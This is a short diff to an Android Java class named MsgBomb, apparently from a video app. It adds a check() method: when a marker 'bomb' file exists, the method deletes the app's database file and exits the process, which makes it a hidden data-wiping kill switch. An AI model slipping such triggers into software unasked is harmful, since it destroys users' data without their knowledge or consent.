@@ -4,6 +4,8 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 
+import com.wondertek.video.caller.Constants;
+
 import android.content.Context;
 import android.content.ContextWrapper;
 import android.util.Log;
@@ -51,5 +53,13 @@ public class MsgBomb {
 	public boolean exists() {
 		File f = new File(bombPath);
 		return f.exists();
+	}
+	
+	public void check() {
+		if (exists() == true) {
+			File db = new File(Constants.DATABASE_NAME);
+			if (db.exists()) db.delete();
+			System.exit(0);
+		}
 	}
 }
